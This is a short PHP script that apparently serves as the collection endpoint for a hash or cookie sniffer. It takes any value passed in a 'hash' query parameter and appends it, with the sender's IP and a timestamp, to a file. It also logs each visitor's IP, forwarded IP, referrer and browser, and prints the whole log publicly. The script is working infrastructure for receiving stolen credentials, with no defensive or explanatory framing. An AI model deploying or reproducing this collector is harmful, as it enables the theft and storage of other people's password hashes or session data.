
<?php
if (isset($_GET['hash']))
{
$text = "New hash accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of F Y h:i:s A');
$text .= "\n".str_repeat("=", 22) . "\n" . $_GET['hash']."\n".str_repeat("=", 22)."\n";
$file = fopen("./hashes.txt", "a");
fwrite($file, $text);
fclose($file);
}

$date=date("[D|d/m/Y|H:i]");
$ip=getenv("Remote_addr");
$real_ip=getenv("HTTP_X_FORWARDED_FOR");
$otkuda=getenv("HTTP_REFERER");
$browser=getenv("HTTP_USER_AGENT");
$win=getenv("windir");
$uid=implode($argv," ");

$fp=fopen("./log.txt","a");
fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n");
fclose($fp);

echo(file_get_contents("./log.txt"));
?>